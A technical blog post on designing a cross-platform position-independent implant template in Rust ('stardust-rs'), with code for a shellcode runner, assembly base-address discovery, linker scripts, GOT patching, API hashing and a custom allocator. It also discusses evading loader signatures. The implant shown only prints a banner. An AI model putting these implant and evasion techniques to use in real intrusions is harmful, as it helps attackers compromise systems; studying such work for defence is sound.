+++
title = "Corroding Defenses: Modern Implant Design"
date = "2025-03-15T01:26:47Z"
author = "Irate-Walrus"
cover = ""
tags = ["rustlang", "implant", "PIC", "cross-platform"]
keywords = ["implant", "Rust", "PIC", "cross-platform"]
readingTime = true
toc = true
+++

## 1.0.0 - Introduction

Two years ago (2023) CISA published [The Urgent Need for Memory Safety in Software Products](https://www.cisa.gov/news-events/news/urgent-need-memory-safety-software-products) where they recommended Rust as a memory-safe and performant replacement for C and C++.

This begs the question, surely a "modern" implant design calls for a "modern" memory safe language? Is this even advisable?

While I answered neither of these questions here. It did confirm to me that, while not always straight forward, a full PIC implant in Rust is both possible and potentially more maintainable than its "unsafe" (who are we kidding here, this is all going to be unsafe anyway) counterparts.

So, grab your favourite pair of socks and let's get going.

## 2.0.0 Reflective Loading: A Standard Convention

Reflective Loading is the current standard for any off-the-shelf memory implants.

Look no further than:
- Cobalt-Strike's [_User Defined Reflective Loader (UDRL)_](https://www.cobaltstrike.com/product/features/user-defined-reflective-loader)
- Havoc C2's [`KaynLoader`](https://github.com/HavocFramework/Havoc/blob/main/payloads/DllLdr/Source/Entry.c)
- Meterpreter's [`ReflectiveLoader`](https://github.com/rapid7/ReflectiveDLLInjection/blob/master/dll/src/ReflectiveLoader.c) - also in use by Sliver C2

Reflective loaders make life easy, objects that require relocations such as static strings "just work", required memory protections are set, and the memory addresses of functions exported by the implant for use by extensions formats such as `BeaconDataParse` and `BeaconPrintf` are known memory addresses.

The reflective loading process can be summarised as (example from [`KaynLoader`](https://github.com/HavocFramework/Havoc/blob/main/payloads/DllLdr/Source/Entry.c)):

1. The executable is copied into allocated memory.

```c
/* KaynLoader() @ https://raw.githubusercontent.com/HavocFramework/Havoc/9f2b14bf1e7544b6845d4ea8981d8b99dc686f4c/payloads/DllLdr/Source/Entry.c */
/* 43 */    if ( NT_SUCCESS( Instance.Win32.NtAllocateVirtualMemory( NtCurrentProcess(), &KVirtualMemory, 0, &KMemSize, MEM_COMMIT, PAGE_READWRITE ) ) )
/* 44 */    {
/* 45 */        // ---- Copy Headers into new allocated memory ----
/* 46 */        Memcpy(KVirtualMemory, KaynLibraryLdr, NtHeaders->OptionalHeader.SizeOfHeaders);
/* 47 */        ( ( PIMAGE_NT_HEADERS ) KVirtualMemory )->OptionalHeader.ImageBase = KVirtualMemory;
/* 48 */
/* 49 */        // ---- Copy Sections into new allocated memory ----
/* 50 */        SecHeader = IMAGE_FIRST_SECTION( NtHeaders );
/* 51 */        for ( DWORD i = 0; i < NtHeaders->FileHeader.NumberOfSections; i++ )
/* 52 */        {
/* 53 */            Memcpy(
/* 54 */                RVA2VA( PVOID, KVirtualMemory, SecHeader[ i ].VirtualAddress ),      // Section New Memory
/* 55 */                RVA2VA( PVOID, KaynLibraryLdr, SecHeader[ i ].PointerToRawData ),    // Section Raw Data
/* 56 */                SecHeader[ i ].SizeOfRawData                                      // Section Size
/* 57 */            );
/* 58 */        }
```

2.  Image relocations are processed and memory protections are set.

```c
/* KaynLoader() @ https://raw.githubusercontent.com/HavocFramework/Havoc/9f2b14bf1e7544b6845d4ea8981d8b99dc686f4c/payloads/DllLdr/Source/Entry.c */
/* 70 */        ImageDir = & NtHeaders->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_BASERELOC ];
/* 71 */        if ( ImageDir->VirtualAddress )
/* 72 */            KReAllocSections( KVirtualMemory, NtHeaders->OptionalHeader.ImageBase, RVA2VA( PVOID, KVirtualMemory, ImageDir->VirtualAddress ) );
/* 73 */
/* 74 */        // ----------------------------------
/* 75 */        // 5. Set protection for each section
/* 76 */        // ----------------------------------
/* 77 */        SecMemory     = KVirtualMemory;
/* 78 */        SecMemorySize = NtHeaders->OptionalHeader.SizeOfHeaders;
/* 79 */        Protection    = PAGE_READONLY;
/* 30 */        OldProtection = 0;
/* 31 */        Instance.Win32.NtProtectVirtualMemory( NtCurrentProcess(), &SecMemory, &SecMemorySize, Protection, &OldProtection );
```

3.  The entry-point is then invoked by the loader.

```c
/* KaynLoader() @ https://raw.githubusercontent.com/HavocFramework/Havoc/9f2b14bf1e7544b6845d4ea8981d8b99dc686f4c/payloads/DllLdr/Source/Entry.c */
/* 139 */        BOOL ( WINAPI *KaynDllMain ) ( PVOID, DWORD, PVOID ) = RVA2VA( PVOID, KVirtualMemory, NtHeaders->OptionalHeader.AddressOfEntryPoint );
/* 140 */        KaynDllMain( KVirtualMemory, DLL_PROCESS_ATTACH, lpParameter );
```

However, Reflective Loading is not without its downsides. Common loading techniques such as [Stephen Fewer's ReflectiveDllInjection](https://github.com/stephenfewer/ReflectiveDLLInjection) are heavily signatured and cleanup across implementations is inconsistent. Reflective loaders and executable headers such as the DOS header/PE header and NT header on Windows often remain in memory. Some frameworks such as Cobalt-Strike have introduced features such as [Beacon User Data (BUD)](https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data) to ensure that loader allocated memory is obfuscated during sleep masking and deallocated on exit. Similarly Brute-Ratel has been erasing the DOS header/PE header and NT header by default since version 0.3.1.

However, there are alternatives.

## 3.0.0 - Position Independent Code (PIC)

Position-Independent Code (PIC) does not rely on a loader to perform its memory relocations and protections. In addition, it does not require an executable header. It is more similar to the shellcode you would expect to be produced by Metasploit as part of a software exploit (although quite a bit larger). Executing PIC is as simple as:

```rust
/* main() @ https://raw.githubusercontent.com/Irate-Walrus/stardust-rs/35f2ed30390c30bb4ea513ecea6ac44ccc3938b3/runner/src/main.rs */
/* 19 */    println!("[*] Allocate RW Memory");
/* 20 */    let buffer_ptr = alloc_rw();
/* 21 */
/* 22 */    println!("[*] Copy Shellcode Into RW Memory");
/* 23 */    unsafe {
/* 24 */        ptr::copy_nonoverlapping(SHELLCODE.as_ptr(), buffer_ptr as *mut u8, SHELLCODE.len());
/* 25 */    }
/* 26 */
/* 27 */    println!("[*] Set Memory RX");
/* 28 */    set_rx(buffer_ptr);
/* 29 */
/* 30 */    println!("[*] Allocation Start Address:\t0x{:x}", buffer_ptr as usize);
/* 31 */    println!(
/* 32 */        "[*] Allocation End Address:\t0x{:x}",
/* 33 */        buffer_ptr as usize + SHELLCODE.len()
/* 34 */    );
/* 35 */
/* 36 */    println!("[*] Allocation Size:\t\t{}B", SHELLCODE.len());
/* 37 */
/* 38 */    println!("{}", STARDUST_BANNER);
/* 39 */    let exec: extern "C" fn() -> ! = unsafe { mem::transmute(buffer_ptr) };
/* 40 */    exec();
```

This does have its own issues, notice that RW -> RX memory allocations still occur but no metadata or loader is required (one less signature). However, what did we loose? Relocations, memory protections, and a known location in memory.

It was at this point in reading a blog by @5pider, [Modern implant design: position independent malware development](https://5pider.net/blog/2024/01/27/modern-shellcode-implant-design) I thought:

_"That looks easy, why does everyone always target Windows (the inferior platform)? I bet I could do a better job, cross-platform, in Rust"_ - some idiot.

Thankfully @5pider had already solved some of these issues for me, although his source code sometimes made me question my sanity.

### 3.1.0 - A Journey in Self-Discovery

So, turns out self-discovery (of the PIC code) in memory isn't so bad, we just need to brutally destroy the existing binary formats using linker scripts, a little custom assembly and we're off to the races.

> **NOTE**
>
> _"A linker or link editor is a computer program that combines intermediate software build files such as object and library files into a single executable file such a program or library"_ - [Wikipedia](https://en.wikipedia.org/wiki/Linker_(computing))
>
> _"The main purpose of the linker script is to describe how the sections in the input files should be mapped into the output file, and to control the memory layout of the output file"_ - [HAW Hamburg](https://users.informatik.haw-hamburg.de/~krabat/FH-Labor/gnupro/5_GNUPro_Utilities/c_Using_LD/ldLinker_scripts.html)
>
> Executable formats such as PEs and ELFs use linker scripts to define their output formats. You can view the linker script for an x86_64 ELF using `ld --verbose -m elf_x86_64`.

Due to differences between ELF and PEs they require slightly different scripts, but the general executable format of a _stardust-rs_ PIC implant template is as follows (in a linker script adjacent format).

```c
*(.text.prologue)       /* aligns the stack by 16-bytes, gets implant base address, and executes implant entrypoint */
*(.text.implant)        /* implant code */

*(.text)                /* code dependencies of implant code */
*(.rdata)               /* read-only (const) data, .rodata in ELF format */

/* Align the page by 0x1000 or 4096 bytes, the default Normal Page Size on Windows & Linux x86_32 and x86_64. So that the `.data` section gets its own page. */
. = ALIGN(0x1000);

*(.data*)               /* initialized static, global, static local read-write data */
*(.bss*)                /* unintialized static, global, static local read-write data */


*(.got*)                /* ELF ONLY - global offset table */

*(.text.epilogue)       /* get RIP/EIP/PC at end of implant to discover implant size */
```

### 3.1.1 - The Prologue

The `.text.prologue` section is located at the beginning of the implant shellcode, so lets start there.

```c
/* .txt.prologue @ https://raw.githubusercontent.com/Irate-Walrus/stardust-rs/35f2ed30390c30bb4ea513ecea6ac44ccc3938b3/stardust/src/stcore/arch/x86_64/x86_64.asm */
/* 16 */    // shellcode entrypoint
/* 17 */    // aligns the stack by 16-bytes to avoid any unwanted
/* 18 */    // crashes while calling win32 functions and execute
/* 19 */    // the true C code entrypoint
/* 20 */    // TY Cracked5pider
/* 21 */    //
/* 22 */    _start:
/* 23 */        push  rsi
/* 24 */        mov   rsi, rsp
/* 25 */        and   rsp, 0xFFFFFFFFFFFFFFF0
/* 26 */        sub   rsp, 0x20
/* 27 */        call  _stmain
/* 28 */        mov   rsp, rsi
/* 29 */        pop   rsi
/* 30 */        ret
/* 31 */
/* 32 */    // get rip to the start of the agent
/* 33 */    _rip_start:
/* 34 */        call _rip_ptr_start
/* 35 */        ret
/* 36 */
/* 37 */    // get the return address of _rip_str and put it into the rax register
/* 38 */    _rip_ptr_start:
/* 39 */        mov rax, [rsp] // get the return address
/* 40 */        sub rax, 0x1b  // subtract the instructions size to get the base address
/* 41 */        ret            // return to _rip_start
```

The section aligns the stack by 16-bytes in lines 24-26 before calculating the base address of the implant by getting the return address of `_rip_ptr_start` and subtracting an offset of `0x1b (27)` (the difference between the return address and the beginning of the shellcode). It then calls `_stmain` the implant entry-point located in `.text.implant`.

To calculate the offset of `0x1b (27)` dump the `.text` section of the compiled implant, identify the return address of `_rip_ptr_start` and take note of its offset.

```
$ objdump -Mintel -dzrW -j .text target/x86_64-unknown-linux-gnu/release/stardust

target/x86_64-unknown-linux-gnu/release/stardust:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <_start>:
       0:       56                      push   rsi
       1:       48 89 e6                mov    rsi,rsp
       4:       48 83 e4 f0             and    rsp,0xfffffffffffffff0
       8:       48 83 ec 20             sub    rsp,0x20
       c:       e8 14 00 00 00          call   25 <_stmain>
      11:       48 89 f4                mov    rsp,rsi
      14:       5e                      pop    rsi
      15:       c3                      ret

0000000000000016 <_rip_start>:
      16:       e8 01 00 00 00          call   1c <_rip_ptr_start>
      1b:       c3                      ret

000000000000001c <_rip_ptr_start>:
      1c:       48 8b 04 24             mov    rax,QWORD PTR [rsp]
      20:       48 83 e8 1b             sub    rax,0x1b
      24:       c3                      ret

```

### 3.1.2 - The Epilogue

The `.text.epilogue` works similarly, adding an offset of `0xa (10)` to the return address of `_rip_ptr_end` located at the end of the implant shellcode.

```c
/* .text.epilogue @ https://raw.githubusercontent.com/Irate-Walrus/stardust-rs/35f2ed30390c30bb4ea513ecea6ac44ccc3938b3/stardust/src/stcore/arch/x86_64/x86_64.asm */
/* 46 */    // get end of the implant
/* 47 */    _rip_end:
/* 48 */        call _rip_ptr_end
/* 49 */        ret
/* 50 */
/* 51 */    // get the return address of _rip_end and put it into the rax register
/* 52 */    _rip_ptr_end:
/* 53 */        mov rax, [rsp] // get the return address
/* 54 */        add rax, 0xa   // get implant end address
/* 55 */        ret            // return to _rip_end
```

### 3.1.3 - Pulling It Together

After defining `_rip_start` and `_rip_end` we can wrap it all up in some unsafe Rust, rip it all out of the `.text` section using `objcopy`, and call it a day.

```rust
/* https://raw.githubusercontent.com/Irate-Walrus/stardust-rs/35f2ed30390c30bb4ea513ecea6ac44ccc3938b3/stardust/src/stcore/arch/x86_64/mod.rs */
/* 13 */   #[inline(never)]
/* 14 */   pub fn rip_start() -> *mut c_void {
/* 15 */       let addr: *mut c_void;
/* 16 */
/* 17 */       unsafe {
/* 18 */           asm!(
/* 19 */               "call _rip_start",  // call the assembly function
/* 20 */               "mov {0}, rax",     // move the value in rax to addr
/* 21 */               out(reg) addr       // output to addr
/* 22 */           );
/* 23 */       }
/* 24 */
/* 25 */       addr
/* 26 */   }
/* 27 */
/* 28 */   #[inline(never)]
/* 29 */   pub fn rip_end() -> *mut c_void {
/* 30 */       let addr: *mut c_void;
/* 31 */
/* 32 */       unsafe {
/* 33 */           asm!(
/* 34 */               "call _rip_end",  // call the assembly function
/* 35 */               "mov {0}, rax",     // move the value in rax to addr
/* 36 */               out(reg) addr       // output to addr
/* 37 */           );
/* 38 */       }
/* 39 */
/* 40 */       addr
/* 41 */   }
```

We can then use these wrappers within the initialisation function.

```rust
/* initialize() @ https://raw.githubusercontent.com/Irate-Walrus/stardust-rs/35f2ed30390c30bb4ea513ecea6ac44ccc3938b3/stardust/src/stcore/os/windows/mod.rs */
/* 48 */    pub unsafe fn initialize() {
/* 49 */        let mut local_inst = Instance::new();
/* 50 */
/* 51 */        local_inst.base.ptr = rip_start();
/* 52 */        let stardust_len = rip_end() as usize - local_inst.base.ptr as usize;
/* 53 */        local_inst.base.len = stardust_len;
```

## 4.0.0 - Memory Protections

So remember linker scripts? I oversimplified, and it's a little more complicated than that. So that the implant can modify variables within the `.data`, `.bss`, `.got` sections it must alter their memory protections from RX to RW. This means the implant needs to know where these sections are in memory.

The offsets of these sections are defined as symbols within the linker script, which can then be used later within the implant:

- `_data_offset`
- `_got_offset`
- `_epilogue_offset`

You can see these symbols being defined in the linker script below.

```c
/* https://raw.githubusercontent.com/Irate-Walrus/stardust-rs/35f2ed30390c30bb4ea513ecea6ac44ccc3938b3/stardust/scripts/linux.ld */
/* 43 */    /* Insert `_data_offset` symbol at linking so it can be used within code. */
/* 44 */    _data_offset = .;
/* 45 */    *(.data*)               /* initialized static, global, static local read-write data */
/* 46 */    *(.bss*)                /* unintialized static, global, static local read-write data */
/* 47 */    _got_offset = .;
/* 48 */    *(.got*)				/* include global offset table so that _data_offset symbol can be used*/
/* 49 */    _epilogue_offset = .;
/* 50 */    *(.text.epilogue)       /* get RIP/EIP/PC at end of implant */
```

Once we have these symbols we can once again wrap them in some unsafe Rust code and use them to set the page containing the implant's modifiable data to RW.

```rust
/* stcore::os::linux::rw_page() @ https://raw.githubusercontent.com/Irate-Walrus/stardust-rs/35f2ed30390c30bb4ea513ecea6ac44ccc3938b3/stardust/src/stcore/os/linux/mod.rs */
/* 33 */    /// Set data, bss, and got page to RW
/* 34 */    /// really this only protects `size_of::<usize>()` but it'll flip the entire page
/* 35 */    /// including `rip_end()`, so don't call that again
/* 36 */    pub unsafe fn rw_page(ptr: *mut c_void) {
/* 37 */        let offset = data_offset();
/* 38 */        let ptr = ptr.byte_add(offset);
/* 39 */        let _ = syscall!(Sysno::mprotect, ptr, size_of::<usize>(), 0x1 | 0x2);
/* 40 */    }
```

On Windows the implant uses a call to `NtProtectVirtualMemory`, once it has been resolved, to similar effect.

## 5.0.0 - Resolving Modules in Memory with API Hashing

Nothing new here, but with PIC you couldn't dynamically link modules even if you wanted to.

Using Rust's [Procedural Macros](https://doc.rust-lang.org/reference/procedural-macros.html) we can hash API symbols at compile-time in a similar way to C++ `constexpr`.

```rust
/* djb2_hash() @ https://raw.githubusercontent.com/Irate-Walrus/stardust-rs/35f2ed30390c30bb4ea513ecea6ac44ccc3938b3/djb2_macro/src/lib.rs */
/* 32 */   #[proc_macro]
/* 33 */   pub fn djb2_hash(input: TokenStream) -> TokenStream {
/* 34 */       // Parse the input tokens into a string literal
/* 35 */       let input_str = parse_macro_input!(input as syn::LitByteStr);
/* 36 */       let inner = input_str.value();
/* 37 */
/* 38 */       // Compute the hash at compile time
/* 39 */       let hash = djb2_hash_u8(&inner);
/* 40 */
/* 41 */       // Generate the output tokens (a constant)
/* 42 */       let output = quote! {
/* 43 */           #hash
/* 44 */       };
/* 45 */
/* 46 */       output.into()
/* 47 */    }
```

This can then be imported used within the implant code.

```rust
/* stcore::os::windows::initialize() @ https://raw.githubusercontent.com/Irate-Walrus/stardust-rs/35f2ed30390c30bb4ea513ecea6ac44ccc3938b3/stardust/src/stcore/os/windows/mod.rs */
/* 55 */   // Load the base address of kernel32.dll.
/* 56 */   local_inst.kernel32.base_addr = resolve_module(djb2_hash!(b"KERNEL32.DLL"));
/* 57 */
/* 58 */   let output_debug_string_a_addr = resolve_function(
/* 59 */       local_inst.kernel32.base_addr,
/* 60 */       djb2_hash!(b"OutputDebugStringA"),
/* 61 */   );
```

On Windows, the `resolve_module` and `resolve_function` functions use the [Process Environment Block (PEB)](https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb) to locate loaded module addresses before parsing their NT Headers and iterating through exports within the `IMAGE_EXPORT_DIRECTORY`. Source code implementing this is abundant.

On Linux, the addresses of loaded modules are retrieved from `link_map` a pointer to which can (often) be found in the `DT_DEBUG` entry within the `PT_DYNAMIC` ELF section which is populated at runtime. I couldn't find any code that implemented this publicly, but you can find it here (written in Rust, sorry) [src/stcore/os/linux/resolve.rs](https://raw.githubusercontent.com/Irate-Walrus/stardust-rs/35f2ed30390c30bb4ea513ecea6ac44ccc3938b3/stardust/src/stcore/os/linux/resolve.rs).

An alternative, and previously implemented method, is parsing the process' `/proc/self/maps` to locate `ld.so` and `libc.so`. However, this results in a significantly larger Linux implant (closer to ~12500B).

Both methods use syscalls to open `proc/self/auxv` or `/proc/self/maps` respectively, but static binaries are a thing so I'm not sure that's too suspicious (and I mean it's Linux, who's checking?).

## 6.0.0 - (Un)Safely Allocating Memory

Using C or C++ you may be used to allocating memory like a terribly unsafe person using something similar to the following code:

```c
/* PreMain() @ https://raw.githubusercontent.com/Cracked5pider/Stardust/da0ba743f9f623066d5058c9af1a7e0613609d11/src/PreMain.c */
/* 65 */    if ( ! ( C_DEF( MmAddr ) = Stardust.Win32.RtlAllocateHeap( Heap, HEAP_ZERO_MEMORY, sizeof( INSTANCE ) ) ) ) {
/* 66 */        return;
/* 67 */    }
```

Rust is special, it hides all such nasties behind a trait (interface) called `GlobalAlloc` so that you can allocate your lovely vectors and strings without a care in the world.
You too can provide a custom implementation of this global instance (oh no, a global, good thing we dealt with this earlier).

```rust
/* StWindowsAllocator @ https://raw.githubusercontent.com/Irate-Walrus/stardust-rs/35f2ed30390c30bb4ea513ecea6ac44ccc3938b3/stardust/src/stcore/os/windows/allocator.rs */
/* 44 */   /// Implementation of the `GlobalAlloc` trait for ` StWindowsAllocator`,
/* 45 */   /// using the NT Heap API for memory management.
/* 46 */   unsafe impl GlobalAlloc for StWindowsAllocator {
/* 47 */       unsafe fn alloc(&self, layout: Layout) -> *mut u8 {
/* 48 */           let instance = Instance::get().unwrap();
/* 49 */           (instance.ntdll.rtl_allocate_heap)(self.handle(), 0, layout.size() as _) as _
/* 50 */       }
/* 51 */
/* 52 */       unsafe fn alloc_zeroed(&self, layout: Layout) -> *mut u8 {
/* 53 */           let instance = Instance::get().unwrap();
/* 54 */           (instance.ntdll.rtl_allocate_heap)(self.handle(), HEAP_ZERO_MEMORY, layout.size() as _) as _
/* 55 */       }
/* 56 */
/* 57 */       unsafe fn dealloc(&self, ptr: *mut u8, _layout: Layout) {
/* 58 */           let instance = Instance::get().unwrap();
/* 59 */           (instance.ntdll.rtl_free_heap)(self.handle(), 0, ptr as _);
/* 60 */       }
/* 61 */
/* 62 */       unsafe fn realloc(&self, ptr: *mut u8, _layout: Layout, new_size: usize) -> *mut u8 {
/* 63 */           let instance = Instance::get().unwrap();
/* 64 */           (instance.ntdll.rtl_re_allocate_heap)(self.handle(), 0, ptr as _, new_size as _) as _
/* 65 */       }
/* 66 */   }
```

This is cool, this means you can do something like this, and Rust is guaranteed to call it on deallocations (provided you didn't leak the memory using [`Box::leak`](https://doc.rust-lang.org/std/boxed/struct.Box.html#method.leak) or [`std::mem::forget`](https://doc.rust-lang.org/std/mem/fn.forget.html)):

```rust
/* 0 */   unsafe fn dealloc(&self, ptr: *mut u8, layout: Layout) {
/* 1 */       // write zeros over all deallocated memory
/* 2 */       for i in 0..layout.size() {
/* 3 */           *(ptr.add(i)) = 0;
/* 4 */       }
/* 5 */
/* 6 */       // int munmap(void *addr, size_t len);
/* 7 */       let result = syscall!(Sysno::munmap, ptr, layout.size());
/* 8 */       result.unwrap();
/* 9 */   }
```

## 7.0.0 - ┬─┬ノ(ಠ益ಠノ)

### 7.1.0 - The Global Offset Table (GOT)

The [Global Offset Table (GOT)](https://en.wikipedia.org/wiki/Global_Offset_Table) is used to map symbols to their absolute memory addresses to enable PIC inside ELF binaries.
The dynamic linker updates the GOT entries at runtime as shared libraries are loaded. We aren't using any shared libraries so this isn't an issue (or so I thought).

Apparently the linker also likes to store pointers to functions with the `compiler_builtins` crate inside the GOT e.g. the following (fairly important) functions:

- `memcpy`
- `memmove`
- `memset`
- `memcmp`
- `bcmp`

This is likely because they are exported symbols using `extern "C"`. Either way, `SEGV`.

So let's patch the GOT (when we know it is going to be used), and finally use that `_got_offset` we defined earlier.

```rust
/* stcore::os::linux::patch_got_offsets() @ https://raw.githubusercontent.com/Irate-Walrus/stardust-rs/35f2ed30390c30bb4ea513ecea6ac44ccc3938b3/stardust/src/stcore/os/linux/mod.rs */
/* 42 */   /// Patch hardcoded memory addresses in the GLOBAL_OFFSET_TABLE
/* 43 */   /// this has the side effect of changing the values of *_offset() to their actual addresses
/* 44 */   /// but we can't call `rip_end()` after `mprotect` call anyway
/* 45 */   pub unsafe fn patch_got_offsets(ptr: *mut c_void) {
/* 46 */       let offset = got_offset() - 1; // I don't know why this off-by-one error exists, but it does.
/* 47 */       let len = epilogue_offset() - offset;
/* 48 */       let got_addr = ptr.byte_add(offset) as *mut usize; // this cast is important, for the call to the usize `add()` later
/* 49 */
/* 50 */       let count = len / core::mem::size_of::<usize>();
/* 51 */
/* 52 */       for i in 0..count {
/* 53 */           let value = got_addr.add(i);
/* 54 */           *value += ptr as usize;
/* 55 */       }
/* 56 */   }
```

This works for the most part, excluding the [`format!`](https://doc.rust-lang.org/std/macro.format.html) macro which also relies on hard-coded memory addresses. You could fix this by having the implant perform its own relocations, but we won't do this here.

### 7.2.0 - i686 (32-bit) Windows and Relative Data Addressing (PIC)

**IT DOESN'T EXIST** ([or so a smart person told me](https://users.rust-lang.org/t/i686-w64-mingw32-gcc-and-relative-data-addressing-pic/122399/2)). So, I guess that's it then and we'll give up . We literally can't compile PIC shellcode for 32-bit Windows.

> **NOTE** - PIC may exist for the `i686-w64-mingw32` using clang see the [-fPIC](https://clang.llvm.org/docs/ClangCommandLineReference.html#cmdoption-clang-fPIC).

Just kidding! _"It's all just machine code in the end"_ - the same idiot

Lets just compile a 32-bit ELF, specify [`stdcall`](https://doc.rust-lang.org/reference/items/external-blocks.html#r-items.extern.abi.stdcall) when required (a [calling convention](https://en.wikipedia.org/wiki/Calling_convention) used by 32-bit Windows), patch the GOT like we did before and get on with it.

We can specify the use of the `stdcall` calling convention like this:

```rust
/* https://raw.githubusercontent.com/Irate-Walrus/stardust-rs/35f2ed30390c30bb4ea513ecea6ac44ccc3938b3/stardust/src/stcore/os/windows/kernel32.rs */
/* 25 */    #[cfg(target_arch = "x86")]
/* 26 */    type OutputDebugStringW = unsafe extern "stdcall" fn(lpOutputString: *const u16);
```

Followed by one of the most cursed lines of code I've ever written:

```rust
/* stcore::os::windows::initialize() @ https://raw.githubusercontent.com/Irate-Walrus/stardust-rs/35f2ed30390c30bb4ea513ecea6ac44ccc3938b3/stardust/src/stcore/os/windows/mod.rs */
/* 127 */   #[cfg(target_arch = "x86")]
/* 128 */   os::windows::patch_got_offsets(local_inst.base.ptr);
```

## 8.0.0 - Pyrrhic Victory

```
$ cargo make -p x86_64-linux run
...SNIP...
[cargo-make] INFO - Execute Command: "./target/x86_64-unknown-linux-gnu/debug/runner"
***     [LOADER]        ***
[*] Allocate RW Memory
[*] Copy Shellcode Into RW Memory
[*] Set Memory RX
[*] Allocation Start Address:   0x700000000000
[*] Allocation End Address:     0x700000001047
[*] Allocation Size:            4167B

***     [STARDUST x86_64]       ***
[*] Hello Stardust!
[*] Stardust Start Address:     0x700000000000
[*] Stardust Length:            4167
[*] Stardust Instance:          0x7f06fe246000
[*] Hitting Breakpoint!
```

The code now works on the following formats:

| Target           | Payload Size |
| ---------------- | ------------ |
| `i686-linux`     | 4141B        |
| `x86_64-linux`   | 4167B        |
| `i686-windows`   | 4141B        |
| `x86_64-windows` | 4120B        |

[stardust-rs](https://github.com/Irate-Walrus/stardust-rs) is the only cross-platform PIC implant template written in Rust in existence (as far as I know :P)

## 9.0.0 - Shouts and the Present Future

Thanks to:

- Everyone who listened to me nag incessantly about this in-person and online.
- @5pider - https://5pider.net/blog/2024/01/27/modern-shellcode-implant-design/
- @wumb0 - https://github.com/wumb0/rust_bof
- @safedv - https://github.com/safedv/Rustic64
- @NinjaParanoid - https://bruteratel.com/research/feature-update/2021/01/30/OBJEXEC/
- @nerditation - https://users.rust-lang.org/t/i686-w64-mingw32-gcc-and-relative-data-addressing-pic/122399
- @oberrich - https://github.com/delulu-hq/phnt-rs

What happens if you wrote a VM for an entirely different architecture and then executed your implant within that? Extensibility without RW -> RX memory?
